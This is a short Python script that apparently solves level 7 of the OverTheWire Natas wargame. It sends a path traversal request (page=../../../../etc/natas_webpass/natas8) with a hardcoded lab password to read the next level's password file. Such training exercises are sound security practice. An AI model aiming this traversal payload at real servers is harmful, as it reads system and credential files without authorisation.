import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'

url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'%username

response = requests.get(url,auth=(username,password) )

content = response.text

print(content)
hashvalue = re.findall("<br>\n(.*)\n\n<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->",content)[0]
print(hashvalue)